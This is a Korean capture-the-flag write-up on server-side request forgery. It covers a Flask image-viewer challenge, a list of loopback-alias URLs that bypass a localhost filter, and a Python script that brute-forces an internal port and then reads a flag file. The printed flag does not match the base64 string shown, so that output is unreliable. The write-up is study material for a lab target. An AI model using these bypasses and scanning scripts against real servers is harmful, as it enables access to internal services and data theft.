# ServerSide : SSRF
웹 개발 언어는 HTTP 요청을 전송하는 라이브러리를 제공한다. 예로들어 PHP는 php-curl, NodeJS는 http, 파이썬은 urllib,requests를 예로 들 수 있다.
이러한 라이브러리는 HTTP 요청을 보낼 클라이언트 뿐만아니라 서버와 서버간 통신을 위해 사용되기도 한다. 
일반적으로 다른 웹 애플리케이션이 존재하는 리소스를 사용하기 위한 목적으로 통신한다. 예로 들어, 마이크로서비스 간 통신, 외부 API 호출, 외부 웹 리소스 다운 등이 있다.
기존의 웹 서비스는 단일 서비스로 구성이 가능했지만, 최근 웹 서비스는 지원하는 기능이 증가함에 따라서 구성요소가 증가했다. 이에 따라서 관리 및 코드의 복잡도를 낮추기 위해서 마이크로서비스들로 웹 서비스를 구현하는 추세히다. 이떄 마이크로서비스는 주로 HTTP, GRPC 등을 사용하여 API 통신을 한다
서비스 간 HTTP 통신이 이뤄질 때 요청 내에 이용자의 입력값이 포함될 수 있는데, 이용자의 입력값이 포함되면 개발자가 의도하지 않은 요청이 전송될 수 있다. 
Server-side Request Forgery(SSRF)는 웹 서비스의 요청을 변조하는 취약점으로, 브라우저가 변조된 요청을 보내는 CSRF와는 다르게 웹 서비스의 권한으로 변조된 요청을 보낼 숭 ㅣㅆ다.


# web-ssrf
flask로 만들어진 image viewer 서비스이다, SSRF 취약점을 이용해 플래그를 획득해야한다. 플래그는 `/app/flag.txt`에 있다

아래의 코드는 `/img-viewer`의 엔드포인트에 대한 코드이다.

```python
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)
```

GET 메소드는 img_viewer를 렌더링한다. POST 메소드는 이용자가 입력한 url에 HTTP 요청을 보내고, 응답을 img_viewer.html를 인자로 하여 렌더링한다.
URL 필터링 또한 elif 구문에 적혀있는데 코드를 보니 localhost, 127.0.0.1이 포함된 URL로의 접근을 막고 error.png를 보여주는 모습이다. 이를 우회한다면 SSRF를 통해 내부 HTTP서버에 접근 할 수 있을 것이다.


아래의 서버는 run_local_server 함수에 대한 코드인데, 로컬 호스트가 127.0.0.1로 되어있는것을 보아 외부에서 이 서버에 접근하는 것은 불가능한것 같다

```python
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
print(local_port)


def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ())

app.run(host="0.0.0.0", port=8000, threaded=True)
```

## URL 필터링 우회

1. 127.0.0.1과 매핑된 도메인 이름 사용
임의의 도메인 이름을 구매하여 127.0.0.1과 연결하고, 그 이름을 url로 사용하여 필터링 우회가 가능하다. 이미 127.0.0.1에 매핑된 `*.vcap.me`를 이용하는 방법도 있다.

2. 127.0.0.1의 alias 이용
하나의 IP는 여러 방식으로 표기될 수 있다. 예로 들어 127.0.0.1을 
- 16진수로 변환 -> 0x7f.0x00.0x00.0x01 -> . 제거 -> 0x7f000001
- 0x7f000001를 10진수로 풀어 쓴 -> 2130706433 -> 각 자리에서 0을 생략한 127.1, 127.0.1 과 같은 호스트를 가리킨다
특시 127.0.0.1 ~ 127.0.0.255 까지는 IP loop-back 주소라고하여 모두 로컬 호스트를 가리킨다

3. localhost의 alias 이용
URL에서 호스트와 스키마는 대소문자를 구분하지 않음

```
http://vcap.me:8000/
http://0x7f.0x00.0x00.0x01:8000/
http://0x7f000001:8000/
http://2130706433:8000/
http://Localhost:8000/
http://127.0.0.255:8000/
```

## 포트 찾기
랜덤한 포트를 찾아야하는데 아까 코드에서 봤듯이 1500 ~ 1800이하인 랜덤한 포트에서 실행되고 있다. 아까 URL을 활용하여 아래의 파이썬 스크립트를 사용한다면, 무차별 대입 공격으로 포트를 찾을 수 있다. 

```python
#!/usr/bin/python3
import requests
import sys
from tqdm import tqdm

# `src` value of "NOT FOUND X"
NOTFOUND_IMG = "iVBORw0KG"

def send_img(img_url):
    global chall_url
    data = {
        "url": img_url,
    }
    response = requests.post(chall_url, data=data)
    return response.text
    
    
def find_port():
    for port in tqdm(range(1500, 1801)):
        img_url = f"http://Localhost:{port}"
        if NOTFOUND_IMG not in send_img(img_url):
            print(f"Internal port number is: {port}")
            break
    return port
    
    
if __name__ == "__main__":
    chall_port = int(sys.argv[1])
    chall_url = f"http://host3.dreamhack.games:{chall_port}/img_viewer"
    internal_port = find_port()
```

위의 익스플로잇 스크립트를 작성한 후 `pyhton3 ssrf.py 20304`로 실행 

```bash
┌──(kali㉿kali)-[~]
└─$ python3 ssrf.py 20304
  9%|██████████▎                                                                                                            | 26/301 [00:05<01:01,  4.44it/s]
Internal port number is: 1526
```

스크립트 결과 내부적인 포트 번호는 1526인 것을 확인했다.
이후 /image_viewer 에서 `http://Localhost:1526/flag.txt` 를 친 후에 페이지 소스에서 base64 방식으로 인코딩 되어있는 값을 디코딩 시켜 flag 값을 확인한다

```
└─$ echo "REh7NDNkZDIxODkwNTY0NzVhN2YzYmQxMTQ1NmExN2FkNzF9" | base64 --decode
DH{ffffflllllaaagggg}
```
